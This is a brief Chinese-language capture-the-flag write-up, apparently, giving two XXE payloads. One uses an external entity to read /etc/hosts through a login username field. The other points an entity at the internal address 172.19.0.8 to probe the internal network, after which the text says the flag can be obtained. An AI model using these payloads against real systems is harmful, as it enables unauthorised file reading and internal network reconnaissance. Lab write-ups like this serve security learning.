* 多一个探测内网的步骤
* 先读/etc/hosts

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///etc/hosts"> ]> 
</user><username>&goodies;</username><password>password</password></user>
```

* 接着探测内网

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "http://172.19.0.8/"> ]> 
</user><username>&goodies;</username><password>password</password></user>
```

* 之后即可获取flag